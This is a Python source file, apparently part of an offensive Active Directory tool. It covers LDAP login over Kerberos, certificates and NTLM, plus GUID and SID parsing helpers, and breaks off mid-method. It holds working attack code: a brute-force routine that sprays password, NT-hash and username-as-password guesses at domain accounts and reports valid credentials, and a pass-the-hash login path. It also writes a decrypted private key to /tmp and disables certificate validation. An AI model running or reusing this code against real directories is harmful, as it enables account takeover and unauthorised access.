#!/usr/bin/python3

##########################################################
#                     Dependencies                       #
##########################################################

# PROTOCOL IMPLEMENTATION = LDAP
from ldap3 import Server, Connection, Tls, NTLM, SASL, EXTERNAL, ENCRYPT, AUTO_BIND_TLS_BEFORE_BIND, KERBEROS, TLS_CHANNEL_BINDING, ALL, SUBTREE, ALL_ATTRIBUTES, ALL_OPERATIONAL_ATTRIBUTES, MODIFY_REPLACE, MODIFY_DELETE, MODIFY_ADD
from ldap3.utils.conv import escape_filter_chars, escape_bytes
from ldap3.core.exceptions import LDAPAttributeError
from ldap3.protocol.microsoft import security_descriptor_control

# ADDITIONAL PROTOCOLS = RPC/SMB/Kerberos and structures
from Utils.SMB import SMBUtil
from Utils.KERBEROS import KerberosUtil
from impacket.structure import Structure

# Others
import base64, hashlib, struct, datetime, enum, io, os, sys, traceback, ctypes, socket, ssl, binascii, random, re, time, string, dns.resolver, requests
import xml.etree.ElementTree as ET, xml.dom.minidom
from io import StringIO
from asn1crypto import x509
from struct import pack
from enum import Enum

from Utils.RPC import RPCUtil
try: # When OpenSSL have MD4 disabled
	ctypes.CDLL("libssl.so").OSSL_PROVIDER_load(None, b"legacy")
	ctypes.CDLL("libssl.so").OSSL_PROVIDER_load(None, b"default")
except:
	pass
import OpenSSL
try:
	from Cryptodome.PublicKey import RSA
except ImportError:
	from Crypto.PublicKey import RSA
try:
	from Cryptodome.Util.number import bytes_to_long, long_to_bytes
except ImportError:
	from Crypto.Util.number import bytes_to_long, long_to_bytes

############################################################
#                     LDAP functions                       #
############################################################

def ldap3KerberosLogin(server, target, username, domain, aesKey, ccache, signing, ldaps, channelBinding):
	user_dn = f"{username}@{domain.upper()}"

	if ldaps:
		print("[+] Using LDAPS")
		if channelBinding:
			print("[+] Channel Binding requested for Kerberos but not implemented")
			print("\t[+] LDAP server will accept authentication anyway")
		conn = Connection(server, user = user_dn, authentication = SASL, sasl_mechanism = KERBEROS)
	else:
		if signing:
			print("[+] Using LDAP Signing")
			conn = Connection(server, user = user_dn, authentication = SASL, sasl_mechanism = KERBEROS, session_security = ENCRYPT)
		else:
			conn = Connection(server, user = user_dn, authentication = SASL, sasl_mechanism = KERBEROS)

	target = target.lower()
	foundST = False
	if ccache != None: # Is there a valid ST ?
		ticket = KerberosUtil.CCache.loadFile(ccache)
		sName = f'ldap/{target}'
		sRealm = domain.lower()
		for creds in ticket.credentials:
			ccServiceName = creds['server'].prettyPrint().split(b'@')[0].decode('utf-8')
			ccServiceRealm = creds['server'].prettyPrint().split(b'@')[1].decode('utf-8')
			if sName == ccServiceName.lower() and sRealm == ccServiceRealm.lower(): # Found a valid ST
				foundST = True
				break

	if not foundST: # No, request It with aesKey or ccache
		print("[+] No required ST available for Kerberos authentication")
		print(f"[+] Requesting LDAP/{target} to {domain.upper()}")
		try:
			tgsRep, cipher, _, clientServiceSessionKey = KerberosUtil.requestST(domain, username, '', domain, '', aesKey, ccache, None, None, None, f"LDAP/{target}", None, None, False, False, False, None, True, skipIntro = True)
			ccache = f"{username}@ldap_{target}@{domain.upper()}.ccache"
		except Exception as e:
			return False, conn

	# Now connect to LDAP with ST and GSSAPI

	os.environ['KRB5CCNAME'] = ccache
	res = conn.bind()
	return res, conn

def connect_ldap(target, signing, ldaps, starttls, channelBinding, username, password, nthash, domain, aesKey, ccache, certFile, pfxPwd, pemPrivKeyFile):
	try:
		print_yellow("[*] Connecting to LDAP server")
		print_yellow("---")
		print()

		# https://offsec.almond.consulting/ldap-authentication-in-active-directory-environments.html
		# https://offsec.almond.consulting/bypassing-ldap-channel-binding-with-starttls.html
		# https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html
		# https://github.com/ThePirateWhoSmellsOfSunflowers/ldap3

		if ccache != None or aesKey != None:
			# GSSAPI
			#	Kerberos authentication with ST/AES Key
			#	Support LDAP
			#		No Channel Binding
			#		Support LDAP Signing
			#	Support LDAP with Start-TLS
			#		No Channel Binding
			#		No LDAP Signing
			#	Support LDAPS
			#		Support Channel Binding (Not implemented, but work anyway despite EPA enforced)
			#		No LDAP Signing

			server = Server(target, use_ssl = ldaps, get_info = ALL)
			logged, conn = ldap3KerberosLogin(server, target, username, domain, aesKey, ccache, signing, ldaps, channelBinding)
			
			if logged:
				if starttls and not ldaps and not signing:
					print("[+] Using Start-TLS")
					conn.start_tls()
			else:
				print(f"[-] Failed to login: {conn.result}", file = sys.stderr)
				return '', None

		elif certFile != None:
			# EXTERNAL
			#	TLS Certificate authentication via Schannel
			#	Support LDAP with Start-TLS
			#		No Channel Binding
			#		No LDAP Signing
			#	Support LDAPS
			#		No Channel Binding
			#		No LDAP Signing

			certData = open(certFile, "rb").read()
			if pemPrivKeyFile == None:
				if pfxPwd != None:
					pfxPwd = pfxPwd.encode()
				privKey, cert, extra_certs = KerberosUtil.pkcs12.load_key_and_certificates (certData, pfxPwd)
				pemPrivKey = privKey.private_bytes (encoding = KerberosUtil.serialization.Encoding.PEM, format = KerberosUtil.serialization.PrivateFormat.TraditionalOpenSSL, encryption_algorithm = KerberosUtil.serialization.NoEncryption(),)
				certData = cert.public_bytes (encoding = KerberosUtil.serialization.Encoding.PEM)
				with open("/tmp/private_key.pem", "wb+") as key_file:
					key_file.write(pemPrivKey)
				with open("/tmp/certificate.pem", "wb+") as cert_file:
					cert_file.write(certData)
				tls = Tls(local_private_key_file = "/tmp/private_key.pem", local_certificate_file = "/tmp/certificate.pem", validate = ssl.CERT_NONE)
			else:
				tls = Tls(local_private_key_file = pemPrivKeyFile, local_certificate_file = certFile, validate = ssl.CERT_NONE)

			if ldaps:
				server = Server(target, use_ssl = True, get_info = ALL, tls = tls)
				if channelBinding:
					print("[+] Using LDAPS and Channel Binding")
					conn = Connection(server, channel_binding = TLS_CHANNEL_BINDING)
				else:
					print("[+] Using LDAPS")
					conn = Connection(server)
				conn.open()
			elif starttls:
				print("[+] Using Start-TLS")
				server = Server(target, use_ssl = False, get_info = ALL, tls = tls)
				conn = Connection(server, authentication = SASL, sasl_mechanism = EXTERNAL, auto_bind = AUTO_BIND_TLS_BEFORE_BIND)
			else:
				print("[-] LDAPS or LDAP with Start-TLS required")
				return '', None

		else:
			# GSSAPI
			#	NTLM authentication with pwd/NT hash
			#	Support LDAP
			#		No Channel Binding
			#		Support LDAP Signing
			#	Support LDAP with Start-TLS
			#		No Channel Binding
			#		No LDAP Signing
			#	Support LDAPS
			#		Support Channel Binding
			#		No LDAP Signing

			if (nthash != ''):
				password = "0" * 32 + ":" + nthash

			server = Server(target, use_ssl = ldaps, get_info = ALL)

			user_dn = f"{domain}\\{username}"
			if ldaps:
				if channelBinding:
					print("[+] Using LDAPS and Channel Binding")
					conn = Connection(server, user_dn, password, channel_binding = TLS_CHANNEL_BINDING, authentication = NTLM, auto_bind = True)
				else:
					print("[+] Using LDAPS")
					conn = Connection(server, user_dn, password, authentication = NTLM, auto_bind = True)
			else:
				if signing:
					print("[+] Using LDAP Signing")
					conn = Connection(server, user_dn, password, authentication = NTLM, session_security = ENCRYPT, auto_bind = True)
				else:
					conn = Connection(server, user_dn, password, authentication = NTLM, auto_bind = True)
			
			if starttls and not ldaps and not signing:
				print("[+] Using Start-TLS")
				conn.start_tls()

		print("[+] Connected to LDAP server")
		return conn, server

	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)
		return '', None

def search(conn, server, baseDN = None, filter = "(objectClass=*)", attributes = [ALL_ATTRIBUTES, ALL_OPERATIONAL_ATTRIBUTES], controls = None):
	global PAGED_SIZE

	if baseDN == None:
		baseDN = server.info.other['defaultNamingContext'][0]
	entry_generator = conn.extend.standard.paged_search(search_base = baseDN,
					search_filter = filter,
					search_scope = SUBTREE,
					attributes = attributes,
					controls = controls,
					paged_size = PAGED_SIZE,
					generator = True)
	return entry_generator

def writeBytes(conn, dn, attribute, bytes, controls = None):
	conn.modify(dn, {attribute: [(MODIFY_REPLACE, [bytes])]}, controls = controls)

	return conn.result

def getAllSchemaIDGUID(conn, server):
	schemaIDGUIDs = {}
	
	base_dn = f"CN=Schema,CN=Configuration,{server.info.other['defaultNamingContext'][0]}"
	entry_generator = search(conn, server, baseDN = base_dn, attributes = ["name", "schemaIDGUID"])
	i = 0
	global PAGED_SIZE
	for entry in entry_generator:
		i += 1
		if (i % PAGED_SIZE == 0):
			maybeSleep()
		if entry["type"] == "searchResEntry":
			if (entry["raw_attributes"]["schemaIDGUID"] != []):
				name = entry["raw_attributes"]["name"][0].decode()
				schemaIDGUID = GUID.from_bytes(entry["raw_attributes"]["schemaIDGUID"][0])
				schemaIDGUIDs[str(schemaIDGUID)] = name
				print(f'"{str(schemaIDGUID)}": "{name}",')

	return schemaIDGUIDs

def getDNs(conn, server, objects):
	dns = []

	base_dn = server.info.other['defaultNamingContext'][0]
	for object in objects:
		maybeSleep()
		escaped_object = escape_filter_chars(object)
		if (object.lower()).endswith(base_dn.lower()): # We have a distinguishedName
			entry_generator = search(conn, server, escaped_object, f"(distinguishedName={escaped_object})", attributes = ["distinguishedName"])
		else: # We can have a name or samAccountName. Treat name as distinguished name started with CN=<name>* to avoid duplicates
			entry_generator = search(conn, server, filter = f"(|(samAccountName={escaped_object})(distinguishedName=CN={escaped_object}*))", attributes = ["distinguishedName"])
		for entry in entry_generator:
			if entry["type"] == "searchResEntry":
				dns += [entry["raw_attributes"]["distinguishedName"][0].decode()]

	return dns

##############################################
#               Brute Force                  #
##############################################

def doBF(ip, signing, ldaps, starttls, channelBinding, usernames, passwords, nthashes, domain, passLogin):
	print_yellow("[*] Brute Force LDAP server")
	print_yellow("---")
	print()

	try:
		usernamesA = []
		if usernames != '':
			try:
				with open(usernames, "r") as f:
					usernamesA = [username[:-1] for username in f.readlines()]
			except:
				usernamesA = [usernames]
		
		passwordsA = []
		if passwords != '':
			try:
				with open(passwords, "r") as f:
					passwordsA = [password[:-1] for password in f.readlines()]
			except:
				passwordsA = [passwords]
		
		nthashesA = []
		if nthashes != '':
			try:
				with open(nthashes, "r") as f:
					nthashesA = [nthash[:-1] for nthash in f.readlines()]
			except:
				nthashesA = [nthashes]

		if ldaps:
			if channelBinding:
				print("[+] Using LDAPS and Channel Binding")
			else:
				print("[+] Using LDAPS")
		else:
			if signing:
				print("[+] Using LDAP Signing")
			else:
				pass
		if starttls and not ldaps and not signing:
			print("[+] Using Start-TLS")

		for username in usernamesA:

			if passLogin:
				try:
					server = Server(ip, use_ssl = ldaps, get_info = ALL)

					user_dn = f"{domain}\\{username}"
					if ldaps:
						if channelBinding:
							conn = Connection(server, user_dn, username, channel_binding = TLS_CHANNEL_BINDING, authentication = NTLM, auto_bind = True)
						else:
							conn = Connection(server, user_dn, username, authentication = NTLM, auto_bind = True)
					else:
						if signing:
							conn = Connection(server, user_dn, username, authentication = NTLM, session_security = ENCRYPT, auto_bind = True)
						else:
							conn = Connection(server, user_dn, username, authentication = NTLM, auto_bind = True)
					
					if starttls and not ldaps and not signing:
						conn.start_tls()

					print(f"[+] Valid account found {username}:{username}")

				except KeyboardInterrupt:
					exit()
				except Exception as e:
					if str(e).find('automatic bind not successful - invalidCredentials') != -1:
						print(f"[-] Invalid/Locked out/Disabled account {username}:{username}", file = sys.stderr)
					else:
						print(f"[-] Got error for {username}:{username}: {str(e)}", file = sys.stderr)
						print('---------------------------------', file = sys.stderr)
						traceback.print_exc()
						print('---------------------------------', file = sys.stderr)
				maybeSleep()

			for password in passwordsA:
				try:
					server = Server(ip, use_ssl = ldaps, get_info = ALL)

					user_dn = f"{domain}\\{username}"
					if ldaps:
						if channelBinding:
							conn = Connection(server, user_dn, password, channel_binding = TLS_CHANNEL_BINDING, authentication = NTLM, auto_bind = True)
						else:
							conn = Connection(server, user_dn, password, authentication = NTLM, auto_bind = True)
					else:
						if signing:
							conn = Connection(server, user_dn, password, authentication = NTLM, session_security = ENCRYPT, auto_bind = True)
						else:
							conn = Connection(server, user_dn, password, authentication = NTLM, auto_bind = True)
					
					if starttls and not ldaps and not signing:
						conn.start_tls()

					print(f"[+] Valid account found {username}:{password}")

				except KeyboardInterrupt:
					exit()
				except Exception as e:
					if str(e).find('automatic bind not successful - invalidCredentials') != -1:
						print(f"[-] Invalid/Locked out/Disabled account {username}:{password}", file = sys.stderr)
					else:
						print(f"[-] Got error for {username}:{password}: {str(e)}", file = sys.stderr)
						print('---------------------------------', file = sys.stderr)
						traceback.print_exc()
						print('---------------------------------', file = sys.stderr)
				maybeSleep()

			for nthash in nthashesA:
				try:
					password = "0" * 32 + ":" + nthash

					server = Server(ip, use_ssl = ldaps, get_info = ALL)

					user_dn = f"{domain}\\{username}"
					if ldaps:
						if channelBinding:
							conn = Connection(server, user_dn, password, channel_binding = TLS_CHANNEL_BINDING, authentication = NTLM, auto_bind = True)
						else:
							conn = Connection(server, user_dn, password, authentication = NTLM, auto_bind = True)
					else:
						if signing:
							conn = Connection(server, user_dn, password, authentication = NTLM, session_security = ENCRYPT, auto_bind = True)
						else:
							conn = Connection(server, user_dn, password, authentication = NTLM, auto_bind = True)
					
					if starttls and not ldaps and not signing:
						conn.start_tls()

					print(f"[+] Valid account found {username}:{nthash}")

				except KeyboardInterrupt:
					exit()
				except Exception as e:
					if str(e).find('automatic bind not successful - invalidCredentials') != -1:
						print(f"[-] Invalid/Locked out/Disabled account {username}:{nthash}", file = sys.stderr)
					else:
						print(f"[-] Got error for {username}:{nthash}: {str(e)}", file = sys.stderr)
						print('---------------------------------', file = sys.stderr)
						traceback.print_exc()
						print('---------------------------------', file = sys.stderr)
				maybeSleep()

	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

########################################################
#                     objectGUID                       #
########################################################

# https://learn.microsoft.com/en-us/windows/win32/api/guiddef/ns-guiddef-guid
# guid.py from https://github.com/skelsec/winacl
class GUID:
	def __init__(self):
		self.Data1 = None
		self.Data2 = None
		self.Data3 = None
		self.Data4 = None

	def to_bytes(self):
		return self.Data1[::-1] + self.Data2[::-1] + self.Data3[::-1] + self.Data4

	def to_buffer(self, buffer):
		buffer.write(self.to_bytes())

	@staticmethod
	def from_bytes(data):
		return GUID.from_buffer(io.BytesIO(data))

	@staticmethod
	def from_buffer(buffer):
		guid = GUID()
		guid.Data1 = buffer.read(4)[::-1]
		guid.Data2 = buffer.read(2)[::-1]
		guid.Data3 = buffer.read(2)[::-1]
		guid.Data4 = buffer.read(8)
		return guid

	@staticmethod
	def from_string(str):
		guid = GUID()
		guid.Data1 = bytes.fromhex(str.split('-')[0])
		guid.Data2 = bytes.fromhex(str.split('-')[1])
		guid.Data3 = bytes.fromhex(str.split('-')[2])
		guid.Data4 = bytes.fromhex(str.split('-')[3])
		guid.Data4 += bytes.fromhex(str.split('-')[4])
		return guid

	def __str__(self):
		return '-'.join([self.Data1.hex(), self.Data2.hex(),self.Data3.hex(),self.Data4[:2].hex(),self.Data4[2:].hex()])

def parseObjectGUID(guidB64):
	print_yellow("[*] Parsing objectGUID")
	print_yellow("---")
	print()

	try:
		# Base64 Decode + Binary format to GUID format
		guid = GUID.from_bytes(base64.b64decode(guidB64))

		# Print GUID
		print(f"[+] objectGUID = {guid.__str__()}")

		return guid.__str__()
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def buildObjectGUID(guidStr):
	print_yellow("[*] Building objectGUID")
	print_yellow("---")
	print()

	try:
		# Build GUID object
		guid = GUID.from_string(guidStr)

		# Export to bytes
		guidBytes = guid.to_bytes()

		# Base64 encode
		guidB64 = base64.b64encode(guidBytes)

		print(f"[+] objectGUID = {guidB64.decode()}")

		return guidB64.decode()
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

#######################################################
#                     objectSid                       #
#######################################################

# sid.py from https://github.com/skelsec/winacl
class DOMAIN_ALIAS_RID(enum.Enum):
	ADMINS = 0x00000220 # A local group used for administration of the domain.
	USERS = 0x00000221 # A local group that represents all users in the domain.
	GUESTS = 0x00000222 # A local group that represents guests of the domain.
	POWER_USERS = 0x00000223 # A local group used to represent a user or set of users who expect to treat a system as if it were their personal computer rather than as a workstation for multiple users.
	ACCOUNT_OPS = 	0x00000224 # A local group that exists only on systems running server operating systems. This local group permits control over nonadministrator accounts.
	SYSTEM_OPS = 0x00000225 # A local group that exists only on systems running server operating systems. This local group performs system administrative functions, not including security functions. It establishes network shares, controls printers, unlocks workstations, and performs other operations.
	PRINT_OPS = 0x00000226 # A local group that exists only on systems running server operating systems. This local group controls printers and print queues.
	BACKUP_OPS = 0x00000227 # A local group used for controlling assignment of file backup-and-restore privileges.
	REPLICATOR = 0x00000228 # A local group responsible for copying security databases from the primary domain controller to the backup domain controllers. These accounts are used only by the system.
	RAS_SERVERS = 0x00000229 # A local group that represents RAS and IAS servers. This group permits access to various attributes of user objects.
	PREW2KCOMPACCESS = 0x0000022A # A local group that exists only on systems running Windows 2000 Server. For more information, see Allowing Anonymous Access.
	REMOTE_DESKTOP_USERS = 0x0000022B # A local group that represents all remote desktop users.
	NETWORK_CONFIGURATION_OPS = 0x0000022C # A local group that represents the network configuration.
	INCOMING_FOREST_TRUST_BUILDERS = 0x0000022D # A local group that represents any forest trust users.
	MONITORING_USERS = 0x0000022E # A local group that represents all users being monitored.
	LOGGING_USERS = 0x0000022F # A local group responsible for logging users.
	AUTHORIZATIONACCESS = 0x00000230 # A local group that represents all authorized access.
	TS_LICENSE_SERVERS = 0x00000231 # A local group that exists only on systems running server operating systems that allow for terminal services and remote access.
	DCOM_USERS = 0x00000232 # A local group that represents users who can use Distributed Component Object Model (DCOM).
	IUSERS = 0X00000238 # A local group that represents Internet users.
	CRYPTO_OPERATORS = 0x00000239 # A local group that represents access to cryptography operators.
	CACHEABLE_PRINCIPALS_GROUP = 0x0000023B # A local group that represents principals that can be cached.
	NON_CACHEABLE_PRINCIPALS_GROUP = 0x0000023C # A local group that represents principals that cannot be cached.
	EVENT_LOG_READERS_GROUP = 0x0000023D # A local group that represents event log readers.
	CERTSVC_DCOM_ACCESS_GROUP = 0x0000023E # The local group of users who can connect to certification authorities using Distributed Component Object Model (DCOM).
	RDS_REMOTE_ACCESS_SERVERS = 0x0000023F  # A local group that represents RDS remote access servers.
	RDS_ENDPOINT_SERVERS = 0x00000240 # A local group that represents endpoint servers.
	RDS_MANAGEMENT_SERVERS = 0x00000241 # A local group that represents management servers.
	HYPER_V_ADMINS = 0x00000242 # A local group that represents hyper-v admins
	ACCESS_CONTROL_ASSISTANCE_OPS = 0x00000243 # A local group that represents access control assistance OPS.
	REMOTE_MANAGEMENT_USERS = 0x00000244 # A local group that represents remote management users.
	DEFAULT_ACCOUNT = 0x00000245 # A local group that represents the default account.
	STORAGE_REPLICA_ADMINS = 0x00000246 # A local group that represents storage replica admins.
	DEVICE_OWNERS = 0x00000247 # A local group that represents can make settings expected for Device Owners.

class DOMAIN_GROUP_RID(enum.Enum):
	ADMINS = 0x00000200 # The domain administrators' group. This account exists only on systems running server operating systems.
	USERS = 0x00000201 # A group that contains all user accounts in a domain. All users are automatically added to this group.
	GUESTS = 0x00000202 # The guest-group account in a domain.
	COMPUTERS = 0x00000203 # The domain computers' group. All computers in the domain are members of this group.
	CONTROLLERS = 0x00000204 # The domain controllers' group. All DCs in the domain are members of this group.
	CERT_ADMINS = 0x00000205 # The certificate publishers' group. Computers running Certificate Services are members of this group.
	ENTERPRISE_READONLY_DOMAIN_CONTROLLERS = 0x000001F2 # The group of enterprise read-only domain controllers.
	SCHEMA_ADMINS = 0x00000206 # The schema administrators' group. Members of this group can modify the Active Directory schema.
	ENTERPRISE_ADMINS = 0x00000207 # The enterprise administrators' group. Members of this group have full access to all domains in the Active Directory forest. Enterprise administrators are responsible for forest-level operations such as adding or removing new domains.
	POLICY_ADMINS = 0x00000208 # The policy administrators' group.
	READONLY_CONTROLLERS = 0x00000209 # The group of read-only domain controllers.
	CLONEABLE_CONTROLLERS = 0x0000020A # The group of cloneable domain controllers.
	CDC_RESERVED = 0x0000020C # The reserved CDC group.
	PROTECTED_USERS = 0x0000020D # 	The protected users group.
	KEY_ADMINS = 0x0000020E # The key admins group.
	ENTERPRISE_KEY_ADMINS = 0x0000020F

class SECURITY_MANDATORY(enum.Enum):
	UNTRUSTED_RID = 0x00000000 # Untrusted.
	LOW_RID = 0x00001000 # Low integrity.
	MEDIUM_RID = 0x00002000 # Medium integrity.
	MEDIUM_PLUS_RID = 0x00002000 + 0x100 # Medium high integrity.
	HIGH_RID = 0x00003000 # High integrity.
	SYSTEM_RID = 0x00004000 # System integrity.
	PROTECTED_PROCESS_RID = 0x00005000

DOMAIN_USER_RID_ADMIN = 0x000001F4
DOMAIN_USER_RID_GUEST = 0x000001F5

SECURITY_LOCAL_SERVICE_RID  = 0x00000013
SECURITY_SERVER_LOGON_RID = 9
SECURITY_NETWORK_SERVICE_RID = 0x00000014

# https://docs.microsoft.com/en-us/windows/win32/secauthz/sid-strings
SDDL_NAME_VAL_MAPS = {
	"AN" : "S-1-5-7", # Anonymous logon. The corresponding RID is SECURITY_ANONYMOUS_LOGON_RID.
	"AO" : 	DOMAIN_ALIAS_RID.ACCOUNT_OPS.value, # Account operators. The corresponding RID is DOMAIN_ALIAS_RID_ACCOUNT_OPS.
	"AU" : 	"S-1-5-11", # Authenticated users. The corresponding RID is SECURITY_AUTHENTICATED_USER_RID.
	"BA" : 	DOMAIN_ALIAS_RID.ADMINS.value, # Built-in administrators. The corresponding RID is DOMAIN_ALIAS_RID_ADMINS.
	"BG" :  DOMAIN_ALIAS_RID.GUESTS.value, # Built-in guests. The corresponding RID is DOMAIN_ALIAS_RID_GUESTS.
	"BO" : 	DOMAIN_ALIAS_RID.BACKUP_OPS.value, # Backup operators. The corresponding RID is DOMAIN_ALIAS_RID_BACKUP_OPS.
	"BU" : 	"S-1-5-32-545", # Built-in users. The corresponding RID is DOMAIN_ALIAS_RID_USERS.
	"CA" :  DOMAIN_GROUP_RID.CERT_ADMINS.value, # Certificate publishers. The corresponding RID is DOMAIN_GROUP_RID_CERT_ADMINS.
	"CD" :  DOMAIN_ALIAS_RID.CERTSVC_DCOM_ACCESS_GROUP.value, # Users who can connect to certification authorities using Distributed Component Object Model (DCOM). The corresponding RID is DOMAIN_ALIAS_RID_CERTSVC_DCOM_ACCESS_GROUP.
	"CG" : 	"S-1-3", # Creator group. The corresponding RID is SECURITY_CREATOR_GROUP_RID.
	"CO" :  "S-1-3-0", # Creator owner. The corresponding RID is SECURITY_CREATOR_OWNER_RID.
	"DA" : 	DOMAIN_GROUP_RID.ADMINS.value, # Domain administrators. The corresponding RID is DOMAIN_GROUP_RID_ADMINS.
	"DC" : 	DOMAIN_GROUP_RID.COMPUTERS.value, # Domain computers. The corresponding RID is DOMAIN_GROUP_RID_COMPUTERS.
	"DD" : 	DOMAIN_GROUP_RID.CONTROLLERS.value, # Domain controllers. The corresponding RID is DOMAIN_GROUP_RID_CONTROLLERS.
	"DG" : 	DOMAIN_GROUP_RID.GUESTS.value, # Domain guests. The corresponding RID is DOMAIN_GROUP_RID_GUESTS.
	"DU" : 	DOMAIN_GROUP_RID.USERS.value, # Domain users. The corresponding RID is DOMAIN_GROUP_RID_USERS.
	"EA" : 	DOMAIN_GROUP_RID.ENTERPRISE_ADMINS.value, # Enterprise administrators. The corresponding RID is DOMAIN_GROUP_RID_ENTERPRISE_ADMINS.
	"ED" : 	SECURITY_SERVER_LOGON_RID, # Enterprise domain controllers. The corresponding RID is SECURITY_SERVER_LOGON_RID.
	"HI" : 	SECURITY_MANDATORY.HIGH_RID.value, # High integrity level. The corresponding RID is SECURITY_MANDATORY_HIGH_RID.
	"IU" : 	"S-1-5-4", # Interactively logged-on user. This is a group identifier added to the token of a process when it was logged on interactively. The corresponding logon type is LOGON32_LOGON_INTERACTIVE. The corresponding RID is SECURITY_INTERACTIVE_RID.
	"LA" : 	DOMAIN_USER_RID_ADMIN, # Local administrator. The corresponding RID is DOMAIN_USER_RID_ADMIN.
	"LG" : 	DOMAIN_USER_RID_GUEST, # Local guest. The corresponding RID is DOMAIN_USER_RID_GUEST.
	"LS" :  SECURITY_LOCAL_SERVICE_RID, # Local service account. The corresponding RID is SECURITY_LOCAL_SERVICE_RID.
	"LW" : 	SECURITY_MANDATORY.LOW_RID.value, # Low integrity level. The corresponding RID is SECURITY_MANDATORY_LOW_RID.
	"ME" : 	SECURITY_MANDATORY.MEDIUM_RID.value, # Medium integrity level. The corresponding RID is SECURITY_MANDATORY_MEDIUM_RID.
	# "MU" :  SDDL_PERFMON_USERS, # Performance Monitor users. TODO ERROR: NO VALUE FOUND FOR THIS!
	"NO" : 	DOMAIN_ALIAS_RID.NETWORK_CONFIGURATION_OPS.value, # Network configuration operators. The corresponding RID is DOMAIN_ALIAS_RID_NETWORK_CONFIGURATION_OPS.
	"NS" : 	SECURITY_NETWORK_SERVICE_RID, # Network service account. The corresponding RID is SECURITY_NETWORK_SERVICE_RID.
	"NU" : 	"S-1-5-2", # Network logon user. This is a group identifier added to the token of a process when it was logged on across a network. The corresponding logon type is LOGON32_LOGON_NETWORK. The corresponding RID is SECURITY_NETWORK_RID.
	"PA" : 	DOMAIN_GROUP_RID.POLICY_ADMINS.value, # Group Policy administrators. The corresponding RID is DOMAIN_GROUP_RID_POLICY_ADMINS.
	"PO" : 	DOMAIN_ALIAS_RID.PRINT_OPS.value, # Printer operators. The corresponding RID is DOMAIN_ALIAS_RID_PRINT_OPS.
	"PS" : 	"S-1-5-10", # Principal self. The corresponding RID is SECURITY_PRINCIPAL_SELF_RID.
	"PU" : 	DOMAIN_ALIAS_RID.POWER_USERS.value, # Power users. The corresponding RID is DOMAIN_ALIAS_RID_POWER_USERS.
	"RC" : 	"S-1-5-12", # Restricted code. This is a restricted token created using the CreateRestrictedToken function. The corresponding RID is SECURITY_RESTRICTED_CODE_RID.
	"RD" : 	DOMAIN_ALIAS_RID.REMOTE_DESKTOP_USERS.value, # Terminal server users. The corresponding RID is DOMAIN_ALIAS_RID_REMOTE_DESKTOP_USERS.
	"RE" : 	DOMAIN_ALIAS_RID.REPLICATOR.value, # Replicator. The corresponding RID is DOMAIN_ALIAS_RID_REPLICATOR.
	"RO" : 	DOMAIN_GROUP_RID.ENTERPRISE_READONLY_DOMAIN_CONTROLLERS.value, # Enterprise Read-only domain controllers. The corresponding RID is DOMAIN_GROUP_RID_ENTERPRISE_READONLY_DOMAIN_CONTROLLERS.
	"RS" :  DOMAIN_ALIAS_RID.RAS_SERVERS.value, # RAS servers group. The corresponding RID is DOMAIN_ALIAS_RID_RAS_SERVERS.
	"RU" :	DOMAIN_ALIAS_RID.PREW2KCOMPACCESS.value, # Alias to grant permissions to accounts that use applications compatible with operating systems previous to Windows 2000. The corresponding RID is DOMAIN_ALIAS_RID_PREW2KCOMPACCESS.
	"SA" : 	DOMAIN_GROUP_RID.SCHEMA_ADMINS.value, # Schema administrators. The corresponding RID is DOMAIN_GROUP_RID_SCHEMA_ADMINS.
	"SI" : 	SECURITY_MANDATORY.SYSTEM_RID.value, # System integrity level. The corresponding RID is SECURITY_MANDATORY_SYSTEM_RID.
	"SO" : 	DOMAIN_ALIAS_RID.SYSTEM_OPS.value, # Server operators. The corresponding RID is DOMAIN_ALIAS_RID_SYSTEM_OPS.
	"SU" : 	"S-1-5-6", # Service logon user. This is a group identifier added to the token of a process when it was logged as a service. The corresponding logon type is LOGON32_LOGON_SERVICE. The corresponding RID is SECURITY_SERVICE_RID.
	"SY" :	"S-1-5-18", # Local system. The corresponding RID is SECURITY_LOCAL_SYSTEM_RID.
	"WD" : 	"S-1-1-0"
}
SDDL_VAL_NAME_MAPS = {v: k for k, v in SDDL_NAME_VAL_MAPS.items()}

# https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/f992ad60-0fe4-4b87-9fed-beb478836861
class SID:
	def __init__(self):
		self.Revision = None
		self.SubAuthorityCount = None
		self.IdentifierAuthority = None
		self.SubAuthority = []

		self.wildcard = None # This is for well-known-sid lookups

	@staticmethod
	def from_string(sid_str, wildcard = False):
		if sid_str[:4] != 'S-1-':
			print(f"[-] {sid_str} is not a SID\n", file = sys.stderr)
			exit()
		sid = SID()
		sid.wildcard = wildcard
		sid.Revision = 1
		sid_str = sid_str[4:]
		t = sid_str.split('-')[0]
		if t[:2] == '0x':
			sid.IdentifierAuthority = int(t[2:],16)
		else:
			sid.IdentifierAuthority = int(t)

		for p in sid_str.split('-')[1:]:
			try:
				p = int(p)
			except Exception as e:
				if wildcard != True:
					raise e
			sid.SubAuthority.append(p)
		return sid

	@staticmethod
	def from_bytes(data):
		return SID.from_buffer(io.BytesIO(data))

	@staticmethod
	def from_buffer(buff):
		sid = SID()
		sid.Revision = int.from_bytes(buff.read(1), 'little', signed = False)
		sid.SubAuthorityCount = int.from_bytes(buff.read(1), 'little', signed = False)
		sid.IdentifierAuthority = int.from_bytes(buff.read(6), 'big', signed = False)
		for _ in range(sid.SubAuthorityCount):
			sid.SubAuthority.append(int.from_bytes(buff.read(4), 'little', signed = False))
		return sid

	def to_bytes(self):
		t = self.Revision.to_bytes(1, 'little', signed = False)
		t += len(self.SubAuthority).to_bytes(1, 'little', signed = False)
		t += self.IdentifierAuthority.to_bytes(6, 'big', signed = False)
